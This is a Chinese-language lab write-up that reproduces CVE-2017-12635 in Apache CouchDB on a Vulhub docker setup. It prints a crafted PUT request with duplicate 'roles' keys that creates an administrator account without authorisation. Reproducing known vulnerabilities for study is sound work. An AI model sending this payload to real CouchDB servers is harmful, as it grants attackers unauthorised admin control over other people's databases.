# 漏洞简介

Apache
CouchDB是一个开源的NoSQL数据库，专一于易用性和成为“彻底拥抱web的数据库”。它是一个使用JSON做为数据存储格式，javascript做为查询语言，MapReduce和HTTP做为API的NoSQL数据库。

CVE-2017-12635：Erlang和JavaScript，对JSON解析方式的不同，导致语句执行产生差异性。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。

 **利用条件**

  1. 使用CouchDB数据库，开启5984端口
  2. 版本<1.7.0以及 <2.1.

# 漏洞复现

cd vulhub-master/couchdb/CVE-2017-12635/  
docker-compose build  
docker-compose up -d  
![图片.png](https://image.3001.net/images/20211029/1635471151_617b4f2fc44a2bf953f04.png!small)

http://127.0.0.1:5984/

![图片.png](https://image.3001.net/images/20211029/1635471934_617b523e36ae383e68fe4.png!small)

http://127.0.0.1:5984/_utils/#login

![图片.png](https://image.3001.net/images/20211029/1635471386_617b501a633d8242e5ebb.png!small)  
admin/admin抓包提示错误

![图片.png](https://image.3001.net/images/20211029/1635471789_617b51adc8426e99509a6.png!small)

对请求包进行改造

`PUT /_users/org.couchdb.user:vulhub HTTP/1.1

Host: 192.168.183.134:5984

Accept: _/_

Accept-Language: en

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
Firefox/78.0

Connection: close

Content-Type: application/json

Content-Length: 112

{

"type": "user",

"name": "vulhub",

"roles": ["_admin"],

"roles":[],

"password": "vulhub111"

}`

![图片.png](https://image.3001.net/images/20211029/1635472653_617b550d22b797d6be6a0.png!small)

账号vulhub密码vulhub111进入登录页面

![图片.png](https://image.3001.net/images/20211029/1635472898_617b560270228a6422ded.png!small)

